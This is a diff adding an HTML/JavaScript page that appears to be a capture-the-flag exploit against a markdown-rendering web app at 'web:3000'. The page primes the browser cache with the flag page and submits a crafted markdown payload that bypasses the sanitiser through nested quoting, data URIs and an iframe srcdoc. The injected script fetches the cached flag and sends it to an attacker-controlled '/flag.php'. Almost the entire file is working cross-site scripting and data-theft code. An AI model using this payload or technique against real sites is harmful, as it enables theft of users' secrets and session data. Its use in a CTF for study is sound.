@@ -1,0 +1,22 @@
+<form id="f" method="post" target="_blank"></form>
+<script>
+	const w = open('http://web:3000/print?flag')
+	setTimeout(() => {
+		w.close()
+		const flagresp = new URL(location)
+		flagresp.pathname = '/flag.php'
+		flagresp.search = ''
+		flagresp.hash = ''
+		f.action =
+			'http://web:3000/?markdown=' +
+			encodeURIComponent(`<div>
+			<div src="data2:<script><iframe useless='">' srcdoc='&lt;script <a href="data2:<link>"></a>>";fetch(\`/print?flag\`,{cache:\`only-if-cached\`,mode:\`same-origin\`}).then(r=>r.text()).then(t=>location.assign(\`${flagresp}?flag=\`+t.split(\`<strong>\`)[1].split(\`</strong>\`)[0]));&lt;/script>'</div>
+		</div>`)
+		f.submit()
+		setTimeout(() => {
+			location = 'http://web:3000/print'
+		}, 1000)
+	}, 1000)
+</script>
+
+<img src="https://httpbingo.org/delay/10" />
